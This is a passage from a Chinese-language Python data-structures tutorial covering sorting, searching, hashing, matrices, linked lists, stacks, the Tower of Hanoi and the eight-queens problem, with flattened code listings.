print('目前的合并排序结果为:',end='') for i in range(index3+1): print(list3[i],' ',end='') print('\\n')def showdata(data): for i in range(len(data)): print('%3d' % data[i], end='') print()def main(): select_sort(list1) showdata(list1) select_sort(list2) showdata(list2) Merge(list1,list2)if __name__ == '__main__': main() 0x4.6 快速排序法又称为分割交换排序法，是目前工人最佳的排序法，也是使用分而治之的方式，先在数据中找到一个虚拟的中间值，并按此中间值将所有打算排序的数据分为两部分。其中，小于中间值的数据值的数据放在左边，大于中间值的数据放在右边，再以同样的方式处理左右两边的数据，直到排序完为止。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import randomdef inputarr(data, size): for i in range(size): data[i] = random.randint(1, 100)def showdata(data, size): for i in range(size): print('%3d' % data[i], end='') print() def quick(d, size, lf, rg): # 第一项键值为d[lf] if lf &lt; rg: # 排序数列的左边与右边 lf_idx = lf + 1 while d[lf_idx] &lt; d[lf]: if lf_idx + 1 &gt; size: break lf_idx += 1 rg_idx = rg while d[rg_idx] &gt; d[lf]: rg_idx -= 1 while lf_idx &lt; rg_idx: d[lf_idx], d[rg_idx] = d[rg_idx], d[lf_idx] lf_idx += 1 while d[lf_idx] &lt; d[lf]: lf_idx += 1 rg_idx -= 1 while d[rg_idx] &gt; d[lf]: rg_idx -= 1 d[lf], d[rg_idx] = d[rg_idx], d[lf] for i in range(size): print('%3d' % d[i], end='') print() quick(d, size, lf, rg_idx - 1) # 以rg_idx为基准点分成左右两半以递归方式 quick(d, size, rg_idx + 1, rg) # 分别为左右两半进行排序直至完成排序def main(): data = [0] * 100 size = int(input('请输入数组大小(100以下)：')) inputarr(data, size) print('您输入的原始数据是：') showdata(data, size) print('排序过程如下：') quick(data, size, 0, size - 1) print('最终的排序结果为：') showdata(data, size)main() 0x4.7基数排序法基数排序法和之前的冒泡、选择、插入、希尔、合并、快速、堆积排序算法都不相同，它并不需要进行元素之间的比较操作。而是属于一种分配模式的排序方式。 基数排序方法按照比较的方向可分为最高位优先（Most Significant Digit First，MSD）和最低位优先（Least Significant Digit First,LSD）两种。MSD算法是从最左边的位数开始比较，而LSD是从最右边的位数开始比较。以LSD对三位数的整数数据来加以排序，它是按照个位、十位数、百位数这样的次序进行排序的。 1）首先每个整数按照个位数字放到列表中 + 从左到右合并后成为：……2)按照十位数字，将其放到列表中： + 从左到右合并后成为 ……3）按照百位数字，按序放到列表中 + 最后合并即可完成最后的排序 1234567891011121314151617181920212223242526272829303132333435import randomdef inputarr(data, size): for i in range(size): data[i] = random.randint(0, 999) # 设置 data 值最大为 3 位数def showdata(data, size): for i in range(size): print('%5d' % data[i], end='') print()def radix(data, size): n = 1 # n为基数，从个位数开始排序 while n &lt;= 100: tmp = [[0] * 100 for row in range(10)] # 设置暂存数组，[0~9位数][数据个数]，所有内容均为0 for i in range(size): # 对比所有数据 m = (data[i] // n) % 10 # m为 n 位数的值，如 36 取十位数(36/10)%10=3 tmp[m][i] = data[i] # 把 data[i] 的值暂存在 tmp 中 k = 0 for i in range(10): for j in range(size): if tmp[i][j] != 0: # 因为一开始设置 tmp =&#123;0&#125;，故不为 0 者即为 data[k] = tmp[i][j] # data 暂存在 tmp 中的值，把 tmp 中的值放 k += 1 # 回 data[ ]里 print('经过%3d位数排序后：' % n, end='') showdata(data, size) n = 10 * ndef main(): data = [0] * 100 size = int(input('请输入数组大小(100以下)：')) print('您输入的原始数据是：') inputarr(data, size) showdata(data, size) radix(data, size)main() 0x4.8堆积排序法堆积排序算法是选择排序算法的改进版本，他可以减少在选择排序中的比较次数，进而减少排序时间。堆积排序用到了二叉树的技巧，它是利用堆积树来完成排序的。堆积树是一种特殊的二叉树，可分为最大堆积树和最小堆积树。 最大堆积树满足如下三个条件： 1）它是一个完全二叉树 2）所有节点都大于或等于它左右子节点的值 3）树根是堆积树中最大的值 最小堆积树满足如下三个条件： 1）它是一个二叉树 2）所有节点都小于或等于它左右子节点的值 3）树根是对堆积树中最小的值 QQ：二叉树转换为最大堆积树： 从树根往下进行比较，大的值就往上排列，知道到达了树叶节点即可。（从二叉树的树根开始从上往下逐一按堆积树建立原则来改变各节点的值，最终得到一棵最大堆积树） 然后根据建立的最大堆积树，从大到小进行提取数据。 首先提取树根作为排好序数组的第一个值，然后在删除了树根的基础上，重新针对剩下的节点建立最大堆积树，然后再将树根放入数组作为第二个值，…… 堆积排序法的分析： 1）在所有情况下，时间复杂度均为o(nlogn) 2）堆积排序不是稳定的排序算法 3）只需要一个额外的空间，空间复杂度为o(n) 12345678910111213141516171819202122232425262728293031323334353637383940414243def heap(data, size): for i in range(int(size / 2), 0, -1): # 建立堆积树节点 ad_heap(data, i, size - 1) print() print('堆积的内容：', end='') for i in range(1, size): # 原始堆积树的内容 print('[%2d] ' % data[i], end='') print('\\n') for i in range(size - 2, 0, -1): # 堆积排序 data[i + 1], data[1] = data[1], data[i + 1] # 头尾节点交换 ad_heap(data, 1, i) # 处理剩余节点 print('处理过程为：', end='') for j in range(1, size): print('[%2d] ' % data[j], end='') print()def ad_heap(data, i, size): j = 2 * i tmp = data[i] post = 0 while j &lt;= size and post == 0: if j &lt; size: if data[j] &lt; data[j + 1]: # 找出最大节点 j += 1 if tmp &gt;= data[j]: # 若树根较大，结束比较过程 post = 1 else: data[int(j / 2)] = data[j] # 若树根较小，则继续比较 j = 2 * j data[int(j / 2)] = tmp # 指定树根为父节点def main(): data = [0, 5, 6, 4, 8, 3, 2, 7, 1] # 原始数组的内容 size = 9 print('原始数组为：', end='') for i in range(1, size): print('[%2d] ' % data[i], end='') heap(data, size) # 建立堆积树 print('排序结果为：', end='') for i in range(1, size): print('[%2d] ' % data[i], end='')main() 0x5查找与哈希算法通常判断一个查找算法的好坏主要由比较次数及查找所需要时间来判断。0x5.1顺序查找顺序查找法又称线性,是一种简单的查找。它的方法是将数据一项一项地按照顺序逐个查找，所以不管数据顺序如何，都得从头到尾遍历一次。0x5.2二分法查找如果要查找的数据已经事先排好序了，则可以使用二分法来进行查找。二分查找法是将数据分割成二等份，再比较键值与中间值得大小，如果键值小于中间值，可确定查找的数据在前段，否则在后半部分。如此分割数直到找到或确定不存在为止。 123456789101112131415def bin_search(data,val): low=0 high=len(data)-1 while low&lt;=high and val!=-1: mid=int((low+high)/2) if val&lt;data[mid]: high=mid-1 elif val&gt;data[mid]: low=mid+1 else: return mid return -1data=[1,2,5,6,8,11,14,17]val=5print(bin_search(data,val)) 0x5.3 插值查找法插值查找法(Interpolation Search)又叫插补查找法，是二分查找法的改进版。它是按照数据位置的分布，利用公式预测数据所在的位置，再以二分法的方式渐渐逼近。使用插值法是假设数据平均分布在数组中，而每一项数据的差距相当接近或有一定距离比例。插值法的公式为： 1Mid=low+((key-data[low])/(data[high]-data[low]))*(high-low) 其中key是要查找的键，data[high]和data[low]是剩余待查找记录中的最大值和最小值 1234567891011121314def interpolation_search(data,val): low=0 high=len(data)-1 while low&lt;=high and val !=-1: mid=low+int((val-data[low])*(high-low)/(data[high]-data[low])) if val==data[mid]: return mid elif val &lt;data[mid]: high=mid-1 else: low=mid+1data=[1,2,5,6,8,11,14,17]val=3print(interpolation_search(data,val)) 0x5.4常见的哈希法简介哈希法是使用哈希函数来计算一个键值所对应的地址，进而建立哈希表格，然后依靠哈希函数来查找到各个键值存放在表格中的地址，查找速度与数据多少无关，在没有碰撞和溢出的情况下，一次读取即可完成 常见的哈希算法有除留余数法，平方取中法，折叠法及数字分析法0x5.4.1除留余数法最简单的哈希函数是将数据除以某一个常数后，取余数来当索引例子:在一个有13个位置的数组中，只使用到7个地址，值分别是12,65,70,99,33,67,48。我们可以把数组内的值除以13，并以其余数来当数组的下标(作为索引)，可以用以下式子表示：h(key)=key mod B 0x5.4.2平方取中法先计算数据的平方，之后再取中间的某段数字作为索引 例子说明将数据存放在100个地址空间中，其操作步骤如下：第一步：将12,65,70,99,33,67,51平方后如下144,4225,4900,9801,1089,4489,2601 第二步：取百位数和十位数作为键值，分别为14,22,90,80,08,48,60 第三步：存放数据 1234567f(14) = 12f(22) = 65f(90) = 70f(80) = 99f(8) = 33f(48) = 67f(60) = 51 0x5.4.3折叠法折叠法是将数据转换成一串数字后，先将这串数字拆成几个部分，再把它们加起来，就可计算出这个键值的Bucket Address(桶地址) 例子说明有一个数据，转换成数字后为2365479125443，若以每4个数字为一个部分则可拆为2365,4791,2544,3。将这4组数字加起来后即为索引值：2365+4791+2544+3=9703—&gt;桶地址 在折叠法中有两种做法，如上例直接将每一部分相加所得的值作为其bucket address，这种方法称为”移动折叠法”。哈希法的设计原则之一就是降低碰撞，如果希望降低碰撞的机会，就可以将上述每一部分数字中的奇数或偶数反转，再相加来取得其bucket address，这种改进的做法称为”边界折叠法”(folding at the boundaries) 0x5.4.4数字分析法适用于数据不会更改，且为数字类型的静态表。再决定哈希函数时先追一检查数据的相对位置和分布情况，将重复性高的部分删除。0x5.5碰撞与溢出问题的处理在哈希法中，当标识符要放入某个通(Bucket，哈希表中存储数据的位置)时，若该桶已经满了，就会发生溢出(Overflow);另一方面哈希法的理想情况是所有数据经过哈希函数运算后都得到不同的值，但现实情况是即使所有关键字段的值都不相同，还是可能得到相同的地址，于是就发生了碰撞(Collision)问题0x5.5.1线性探测算法原理简介线性探测法是当发生碰撞情况时，若该索引对应的存储位置已有数据，则以线性的方式往后寻找空的存储位置，一旦找到位置就把数据放进去。线性探测法通常把哈希的位置视为环形结构，如此一来若后面的位置已被填满而前面还有位置时，可以将数据放到前面 线性探测算法 1234567def create_table(num,index): temp = num % INDEXBOX while True: if index[temp]==-1: index[temp]=num else: temp=(temp+1)%INDEXBOX 范例:以除留余数法的哈希函数取得索引值，再以·线性探测法来存储数据 12345678910111213141516171819202122232425262728293031323334353637383940import randomINDEXBOX = 10MAXNUM = 7def print_data(data,max_number): print(\"\\t\",end=\"\") for i in range(max_number): print(\"[%2d]\" %data[i],end=\"\") print()def create_table(num,index): temp = num%INDEXBOX while True: if index[temp]==-1: index[temp]=num break else: temp=(temp+1)%INDEXBOXindex = [None]*INDEXBOXdata = [None]*MAXNUMprint(\"原始数组值：\")for i in range(MAXNUM): data[i]=random.randint(1,20)for i in range(INDEXBOX): index[i]=-1print_data(data,MAXNUM)print(\"哈希表内容：\")for i in range(MAXNUM): create_table(data[i],index) print(\"%2d =&gt;\" %data[i],end=\"\") print_data(index,INDEXBOX)print(\"完成哈希表：\")print_data(index,INDEXBOX) 0x5.5.2平方探测法线性探测法有一个缺点，就是相类似的键值经常会聚集在一起，因此可以考虑以平方探测法来加以改进。在平方探测中，当溢出发生时，下一次查找的地址是(f(x)+i)mod B与(f(x)-i)mod B，即让数据值加或减i的平方 例子说明数据值key，哈希函数f 123456789第一次查找：f(key)第二次查找：(f(key)+1^2)%B第三次查找：(f(key)-1^2)%B第四次查找：(f(key)+2^2)%B第五次查找：(f(key)-2^2)%B..................第n次查找：(f(key)+-((B-1)/2)^2)%B,其中，B必须为4j+3型的质数，且1&lt;=i&lt;=(B-1)/2 0x5.5.3再哈希法再哈希法就是一开始就先设置一系列的哈希函数，如果使用第一种哈希函数出现溢出时就改用第二种，如果第二种也出现溢出就用第三种，一直到没有发生溢出为止 例子说明数据：681,467,633,511,100,164,472,438,445,366,118其中哈希函数为(此处的m=13) 123456789101112131415161718f1 = h(key) = key MOD mf2 = h(key) = (key+2) MOD mf3 = h(key) = (key+4) MOD m说明如下：第一次：使用第一种哈希函数f1 = h(key) = key MOD m，得到的哈希地址如下：```bash681 ---&gt; 5467 ---&gt; 12633 ---&gt; 9511 ---&gt; 4100 ---&gt; 9164 ---&gt; 8472 ---&gt; 4438 ---&gt; 9445 ---&gt; 3366 ---&gt; 2118 ---&gt; 1 第二步：其中100,472,438都发生碰撞，再使用第二种哈希函数f2 = h(key) = (key+2) MOD m，进行数据的地址 123100 ---&gt; h(100+2) = 102 mod 13 = 11472 ---&gt; h(472+2) = 474 mod 13 = 6438 ---&gt; h(438+2) = 440 mod 13 = 11 第三步：438仍发生碰撞问题，使用第三种哈希函数f3 = h(key) = (key+4) MOD m，重新进行438地址的安排 1438 ---&gt; h(438+4) = 442 mod 13 = 0 0x6 数组与链表算法数组与链表都是相当重要的结构化数据类型(structured data type)，也都是典型线性表的应用。按照内存存储的方式，基本上可分为以下两种方式：1.静态数据结构(static data structure)数据类型就是一种典型的静态数据结构，它使用连续分配的内存空间(contiguous allocation)来存储有序表中的数据。静态数据结构是在编译时就给相关的变量分配好内存空间。缺点是删除或加入数据时，需要移动大量的数据 2.动态数据结构(dynamic data structure)动态数据结构又称为”链表”(linked list)，它使用不连续的内存空间存储具有线性表特性的数据。优点是数据的插入或删除都相当方便，不需要移动大量数据 0x6.1矩阵0x6.1.1 矩阵相加相加的两个矩阵对应的行数与列数都必须相等，而相加后的矩阵的行数与列数也是相同的 123456789101112A=[[1,3,5],[7,9,11],[13,15,17]]B=[[9,8,7],[6,5,4],[3,2,1]]N=3C=[[None]*N for row in range(N)]for i in range(3): for j in range(3): C[i][j]=A[i][j]+B[i][j]print('[矩阵A和矩阵B相加的结果]')for i in range(3): for j in range(3): print('%d'%C[i][j],end='\\t') print() 0x6.1.2矩阵相乘两个矩阵A与B相乘受到某些限制。首先，必须符合A为一个mn的矩阵，B为np的矩阵，对AB之后的结果为一个mp的矩阵C 12345678910111213141516171819202122232425262728293031323334353637383940def MatrixMultiply(arrA, arrB,arrC,M,N,P): global C if M&lt;=0 or N&lt;=0 or P&lt;=0: print('[错误:维数M,N,P必须大于0]') return for i in range(M): for j in range(P): Temp=0 for k in range(N): Temp = Temp + int(arrA[i*N+k])*int(arrB[k*P+j]) arrC[i*P+j] = Tempprint('请输入矩阵A的维数(M,N): ')M=int(input('M= '))N=int(input('N= '))A=[None]*M*N #声明大小为MxN的列表Aprint('[请输入矩阵A的各个元素]')for i in range(M): for j in range(N): A[i*N+j]=input('a%d%d='%(i,j))print('请输入矩阵B的维数(N,P): ')N=int(input('N= '))P=int(input('P= '))B=[None]*N*P #声明大小为NxP的列表Bprint('[请输入矩阵B的各个元素]')for i in range(N): for j in range(P): B[i*P+j]=input('b%d%d='%(i,j))C=[None]*M*P #声明大小为MxP的列表CMatrixMultiply(A,B,C,M,N,P)print('[AxB的结果是]')for i in range(M): for j in range(P): print('%d' %C[i*P+j], end='\\t') print() 0x6.1.3转置矩阵“转置矩阵”(A)就是把原矩阵的行坐标元素与列坐标元素互相调换，假设A为A的转置矩阵，则有A[i,j]=A[j,i] 123456789101112131415161718192021arrA = [[1,2,3,4],[5,6,7,8],[9,10,11,12],[13,14,15,16]]N = 4arrB = [[None]*N for row in range(N)]print(\"原设置的矩阵内容：\")for i in range(4): for j in range(4): print(\"%d\" %arrA[i][j],end=\"\\t\") print()for i in range(4): for j in range(4): arrB[i][j] = arrA[j][i]print(\"转置矩阵内容：\")for i in range(4): for j in range(4): print(\"%d\" % arrB[i][j], end=\"\\t\") print() 0x6.2 链表在python中，如果以动态分配产生链表节点的节点，可以先行定义一个类，接着在该类中定义一个指针字段，作用是指向下一个链表节点，另外该类中至少要有一个数据字段。例如，我们声明一个学生成绩链表节点的结构声明，并且包含姓名(name)，成绩(score)两个数据字段与一个指针字段(next)。在python语言中可以声明如下： 12345class student: def __init__(self): self.name=\"\" self.score=0 self.next=None 完成节点类的声明后，就可以动态建立链表中的每个节点。假设现在要新增一个节点至链表的末尾，且ptr指向链表的第一个节点，在程序上必须设计4个步骤： 动态分配内存空间给新节点使用将原链表尾部的指针(next)指向新元素所在的内存位置将ptr指针指向新的节点的内存位置，表示这是新的链表尾部由于新节点当前为链表的最后一个元素，因此将它的指针(next)指向None例如：将s1的next变量指向s2，而且s2的next变量指向None 12s1.next=s2s2.next=None python程序片段是建立学生节点的单向链表的算法： 1234567891011121314151617181920212223242526class student: def __init__(self): self.name=\"\" self.score=0 self.next=Nonehead = student()head.next = Noneptr = headselect = 0while select!=2: print(\"(1)添加 (2)离开=&gt;\") try: select = int(input(\"请输入一个选项：\")) except ValueError: print(\"输入错误\") print(\"请重新输入\\n\") if select==1: new_data = student() new_data.name = input(\"姓名：\") new_data.no=input(\"学号：\") new_data.Math=eval(input(\"数学成绩：\")) ptr.next = new_data new_data.next = None ptr = ptr.next 0x6.2.1 单向链表的连接功能对于两个或两个以上的连接(concatenation，也称为级联)，其实现方法很容易：只要将链表的首尾相连即可范例：将两组学生成绩的链表连接起来，并输出新的学生的成绩链表。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980import sysimport randomdef concatlist(ptr1,ptr2): ptr=ptr1 while ptr.next!=None: ptr=ptr.next ptr.next=ptr2 return ptr1class employee: def __init__(self): self.num=0 self.salary=0 self.name='' self.next=Nonefindword=0data=[[None]*2 for row in range(12)]namedata1=['Allen','Scott','Marry','Jon','Mark','Ricky','Lisa','Jasica', 'Hanson','Amy','Bob','Jack']namedata2=['May','John','Michael','Andy','Tom','Jane','Yoko','Axel','Alex','Judy','Kelly','Lucy']for i in range(12): data[i][0]=i+1 data[i][1]=random.randint(51,100)head1=employee() #建立第一组链表的头部if not head1: print('Error!! 内存分配失败!!') sys.exit(0) head1.num=data[0][0]head1.name=namedata1[0]head1.salary=data[0][1]head1.next=Noneptr=head1for i in range(1,12): #建立第一组链表 newnode=employee() newnode.num=data[i][0] newnode.name=namedata1[i] newnode.salary=data[i][1] newnode.next=None ptr.next=newnode ptr=ptr.next for i in range(12): data[i][0]=i+13 data[i][1]=random.randint(51,100)head2=employee() #建立第二组链表的头部if not head2: print('Error!! 内存分配失败!!') sys.exit(0) head2.num=data[0][0]head2.name=namedata2[0]head2.salary=data[0][1]head2.next=Noneptr=head2for i in range(1,12): #建立第二组链表 newnode=employee() newnode.num=data[i][0] newnode.name=namedata2[i] newnode.salary=data[i][1] newnode.next=None ptr.next=newnode ptr=ptr.next i=0ptr=concatlist(head1,head2) #将链表相连print('两个链表相连的结果为：')while ptr!=None: #打印链表的数据 print('[%2d %6s %3d] =&gt; ' %(ptr.num,ptr.name,ptr.salary),end='') i=i+1 if i&gt;=3: print() i=0 ptr=ptr.next 0x6.2.2单向链表的节点在单向链表类型的数据结构中，若要在链表中删除一个节点，如同一列火车中拿掉原来的车厢，根据所删除节点的位置会有以下三种不同的情况：(1)删除链表的第一个节点只要把链表头指针指向第二个节点即可python算法如下： 12top=headhead=head.next (2)删除链表的最后一个节点只要指向最后一个节点ptr的指针直接指向None即可python算法如下： 12ptr.next=tailptr.next=None (3)删除链表内的中间节点只要将删除节点的前一个节点的指针指向将要被删除节点的下一个节点即可 !! python算法如下： 12Y=ptr.nextptr.next=Y.next 范例:在员工数据的链表中删除节点，并且允许所删除的节点有在链表头部，链表尾部和链表中间三种不同位置的情况。最后离开时，列出此链表的最后所有节点的数据字段的内容。结构成员类型如下： 123456class employee: def __init__(self): self.num=0 self.salary=0 self.name=\"\" self.next=None 代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import sysclass employee: def __init__(self): self.num = 0 self.salary = 0 self.name = '' self.next = Nonedef del_ptr(head, ptr): # 删除节点子程序 top = head if ptr.num == head.num: # [情形1]:要删除的节点在链表头部 head = head.next print('已删除第 %d 号员工 姓名：%s 薪资:%d' % (ptr.num, ptr.name, ptr.salary)) else: while top.next != ptr: # 找到删除节点的前一个位置 top = top.next if ptr.next == None: # 删除在链表末尾的节点 top.next = None print('已删除第 %d 号员工 姓名：%s 薪资:%d' % (ptr.num, ptr.name, ptr.salary)) else: top.next = ptr.next # 删除在串行中的任一节点 print('已删除第 %d 号员工 姓名：%s 薪资:%d' % (ptr.num, ptr.name, ptr.salary)) return head # 返回链表def main(): findword = 0 namedata = ['Allen', 'Scott', 'Marry', 'John', 'Mark', 'Ricky', 'Lisa', 'Jasica', 'Hanson', 'Amy', 'Bob', 'Jack'] data = [[1001, 32367], [1002, 24388], [1003, 27556], [1007, 31299], [1012, 42660], [1014, 25676], [1018, 44145], [1043, 52182], [1031, 32769], [1037, 21100], [1041, 32196], [1046, 25776]] print('员工编号 薪水 员工编号 薪水 员工编号 薪水 员工编号 薪水') print('-------------------------------------------------------') for i in range(3): for j in range(4): print('%2d [%3d] ' % (data[j * 3 + i][0], data[j * 3 + i][1]), end='') print() head = employee() # 建立链表头部 if not head: print('Error!! 内存分配失败!!') sys.exit(0) head.num = data[0][0] head.name = namedata[0] head.salary = data[0][1] head.next = None ptr = head for i in range(1, 12): # 建立链表 newnode = employee() newnode.num = data[i][0] newnode.name = namedata[i] newnode.salary = data[i][1] newnode.num = data[i][0] newnode.next = None ptr.next = newnode ptr = ptr.next while (True): findword = int(input('请输入要删除的员工编号,要结束删除过程,请输入-1：')) if (findword == -1): # 循环中断条件 break else: ptr = head find = 0 while ptr != None: if ptr.num == findword: ptr = del_ptr(head, ptr) find = find + 1 head = ptr ptr = ptr.next if find == 0: print('######没有找到######') ptr = head print('\\t员工编号 姓名\\t薪水') # 打印剩余链表中的数据 print('\\t==============================') while (ptr != None): print('\\t[%2d]\\t[ %-10s]\\t[%3d]' % (ptr.num, ptr.name, ptr.salary)) ptr = ptr.nextmain() 0x6.2.3单向链表的反转如果要将单向链表反转，则必须使用三个指针变量python算法如下： 12345678910111213141516class employee: def __init__(self): self.num=0 self.salary=0 self.name=\"\" self.next=None def invert(x): # x为链表的头指针 p=x # 将p指向链表的开头 q=None # q是p的前一个节点 while p!=None: r=q # 将r接到q之后 q=p # 将q接到p之后 p=p.next # p移到下一个节点 q.next=r # q连接到之前的节点 return q 在算法invert(X)中，我们使用了p,q,r三个指针变量，它的演变过程如下：第一步：执行while循环前 第二步：执行whilex第三步：第二次执行while循环当执行到p=None时，整个单向链表就整个反转过来了范例: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364class employee: def __init__(self): self.num=0 self.salary=0 self.name='' self.next=Nonefindword=0namedata=['Allen','Scott','Marry','Jon', \\ 'Mark','Ricky','Lisa','Jasica', \\ 'Hanson','Amy','Bob','Jack']data=[[1001,32367],[1002,24388],[1003,27556],[1007,31299], \\ [1012,42660],[1014,25676],[1018,44145],[1043,52182], \\ [1031,32769],[1037,21100],[1041,32196],[1046,25776]]head=employee() #建立链表头部if not head: print('Error!! 内存分配失败!!') sys.exit(0)head.num=data[0][0]head.name=namedata[0]head.salary=data[0][1]head.next=Noneptr=headfor i in range(1,12): #建立链表 newnode=employee() newnode.num=data[i][0] newnode.name=namedata[i] newnode.salary=data[i][1] newnode.next=None ptr.next=newnode ptr=ptr.nextptr=headi=0print('反转前的员工链表节点数据：')while ptr !=None: #打印链表数据 print('[%2d %6s %3d] =&gt; ' %(ptr.num,ptr.name,ptr.salary), end='') i=i+1 if i&gt;=3: #三个元素为一行 print() i=0 ptr=ptr.nextptr=headbefore=Noneprint('\\n反转后的链表节点数据：')while ptr!=None: #链表反转,利用三个指针 last=before before=ptr ptr=ptr.next before.next=lastptr=beforewhile ptr!=None: print('[%2d %6s %3d] =&gt; ' %(ptr.num,ptr.name,ptr.salary), end='') i=i+1 if i&gt;=3: print() i=0 ptr=ptr.next 0x7堆栈与队列算法堆栈结构在计算机领域中的应用相当广泛，常用于计算机程序的运行，例如递归调用、子程序调用。队列在计算机领域中的应用也相当广泛，例如计算机的模拟、CPU的作业调度、外围设备联机并发处理系统的应用以及图形遍历的广度优先搜索法。 0x7.1堆栈0x7.1.1数组来实现堆栈优点：用列表实现堆栈设计非常简单缺点：如果堆栈本身的大小是变动的，但列表的大小只能是预先规划和声明的，则列表规划太大会浪费空间，规划过小则不够用。 范例:使用数组结构来设计一个python程序，用循环来控制元素压入堆栈或弹出堆栈，并仿真堆栈的各种操作，此堆栈的最大容量是100个元素，其中必须包括压入(push)和弹出(pop)，并在最后输出堆栈内的所有元素。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162MAXSTACK = 100 # 定义堆栈的最大容量global stackstack = [None] * MAXSTACK # 堆栈的数组声明top = -1 # 堆栈的顶端# 判断是否为空堆栈def isEmpty(): if top == -1: return True else: return False# 将指定的数据压入堆栈def push(data): global top global MAXSTACK global stack if top &gt;= MAXSTACK - 1: print('堆栈已满,无法再加入') else: top += 1 stack[top] = data # 将数据压入堆栈# 从堆栈弹出数据*/def pop(): global top global stack if isEmpty(): print('堆栈是空') else: print('弹出的元素为: %d' % stack[top]) top = top - 1# 主程序i = 2count = 0while True: i = int(input('要压入堆栈,请输入1,要弹出则输入0,停止操作则输入-1: ')) if i == -1: break elif i == 1: value = int(input('请输入元素值:')) push(value) elif i == 0: pop()print('============================')if top &lt; 0: print('\\n 堆栈是空的')else: i = top while i &gt;= 0: print('堆栈弹出的顺序为:%d' % (stack[i])) count += 1 i = i - 1 printprint('============================') 范例:设计一个python程序，以数组仿真扑克牌洗牌以及发牌的过程。使用随机数来生成扑克牌放入堆栈，放满52张牌后开始发牌，使用堆栈功能来给4个人发牌。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import randomglobal toptop = -1k = 0def push(stack, MAX, val): global top if top &gt;= MAX - 1: print('[堆栈已经满了]') else: top = top + 1 stack[top] = valdef pop(stack): global top if top &lt; 0: print('[堆栈已经空了]') else: top = top - 1 return stack[top]def shuffle(old): result = [] while old: p = random.randrange(0, len(old)) result.append(old[p]) old.pop(p) return resultcard = [None] * 52card_new = [None] * 52stack = [0] * 52for i in range(52): card[i] = i + 1print('[洗牌中...请稍候!]')card_new = shuffle(card)i = 0while i != 52: push(stack, 52, card_new[i]) # 将52张牌压入堆栈 i = i + 1print('[逆时针发牌]')print('[显示各家的牌] 东家\\t 北家\\t 西家\\t 南家')print('=================================')while top &gt;= 0: # print(stack[top]) style = (stack[top]) % 4 # 计算牌的花色 # print('style=', style) if style == 0: # 梅花 ascVal = 'club' elif style == 1: # 方块 ascVal = 'diamond' elif style == 2: # 红心 ascVal = 'heart' elif style == 3: ascVal = 'spade' # 黑桃 print('[%s%3d]\\t' % (ascVal, stack[top] % 13 + 1), end='') if top % 4 == 0: print() top -= 1 0x7.1.2 用链表实现堆栈优点：随时可以动态改变链表的长度，能有效利用内存资源，缺点：设计的算法较为复杂。 利用链表实现堆栈时，同样需要定义链表节点，包含一个next指针。范例：设计一个python程序以链表来实现堆栈操作，并使用循环来控制元素的压入堆栈或弹出堆栈，其中必须包括压入(push)和弹出(pop)函数，并在最后输出堆栈内的元素。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class Node: # 堆栈链结节点的声明 def __init__(self): self.data = 0 # 堆栈数据的声明 self.next = None # 堆栈中用来指向下一个节点top = None# 判断堆栈是否为空，是空返回1，否则返回0def isEmpty(): global top if (top == None): return 1 else: return 0# 将指定的数据压入堆栈def push(data): global top new_add_node = Node() new_add_node.data = data # 将传入的值指定为节点的内容 new_add_node.next = top # 将新节点指向堆栈的顶端 top = new_add_node # 新节点成为堆栈的顶端# 从堆栈弹出数据def pop(): global top if isEmpty(): print('===目前为空堆栈===') return -1 else: ptr = top # 指向堆栈的顶端 top = top.next # 将堆栈顶端的指针指向下一个节点 temp = ptr.data # 弹出堆栈的数据 return temp # 将从堆栈弹出的数据返回给主程序# 主程序while True: i = int(input('要压入堆栈,请输入1,要弹出则输入0,停止操作则输入-1: ')) if i == -1: break elif i == 1: value = int(input('请输入元素值:')) push(value) elif i == 0: print('弹出的元素为%d' % pop())print('============================')while (not isEmpty()): # 将数据陆续从顶端弹出 print('堆栈弹出的顺序为:%d' % pop()) 0x7.1.3汉诺塔问题的求解算法该游戏是在一块铜板装置上，有三根杆(编号A、B、C)，在A杆自下而上、由大到小按顺序放置64个金盘(如下图)。游戏的目标：把A杆上的金盘全部移到C杆上，并仍保持原有顺序叠好。操作规则：每次只能移动一个盘子，并且在移动过程中三根杆上都始终保持大盘在下，小盘在上，操作过程中盘子可以置于A、B、C任一杆上汉诺塔问题归纳成三个步骤:1)将n-1个盘子从木杆1移动到了木杆22)将第n个最大盘子从木桩1移动到木桩33)将n-1个盘子从木桩2移动到了木桩3 123456789def hanoi(n,p1,p2,p3): if n==1: print('盘子从%d移到%d'%(p1,p3)) else: hanoi(n-1,p1,p3,p2) print('盘子从%d移到%d'%(p1,p3)) hanoi(n-1,p2,p1,p3)j=int(input('请输入要移动盘子的数量:'))hanoi(j,1,2,3) 0x7.1.4八皇后问题八皇后问题也是一种常见的堆栈的应用。现在要放入多个皇后到棋盘上，相互之间还不能吃到对方。后放入的皇后，放入前必须考虑所放位置的直线方向、横线方向或对角线方向是否已经被放置了旧皇后，否则就会被先放入的旧皇后吃掉。 4皇后在4x4的棋盘上，8皇后问题在8x8的棋盘上，N皇后问题就在NXN的棋盘上。 在实际过程中也会用到回朔法：如果放置新皇后的该行（列）的8个位置都没有办法放置新皇后（放入都会被之前的吃掉），此时必须从堆栈中弹出前一个皇后的位置，并在该行（列）中重新寻找另一个新的位置来放，再将该位置压入堆栈中，而这种方式就是一种回溯算法的应用。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051global queenglobal numberEIGHT = 8 # 定义堆栈的最大容量queen = [None] * 8 # 存放8个皇后的行位置number = 0 # 计算总共有几组解的总数# 决定皇后存放的位置# 输出所需要的结果def print_table(): global number x = y = 0 number += 1 print('') print('八皇后问题的第%d组解\\t' % number) for x in range(EIGHT): for y in range(EIGHT): if x == queen[y]: print('&lt;q&gt;', end='') else: print('&lt;-&gt;', end='') print('\\t') input('\\n..按下任意键继续..\\n')# 测试在(row,col)上的皇后是否遭受攻击# 若遭受攻击则返回值为1,否则返回0def attack(row, col): global queen i = 0 atk = 0 offset_row = offset_col = 0 while (atk != 1) and i &lt; col: offset_col = abs(i - col) offset_row = abs(queen[i] - row) # 判断两皇后是否在同一行或在同一对角线上 if queen[i] == row or offset_row == offset_col: atk = 1 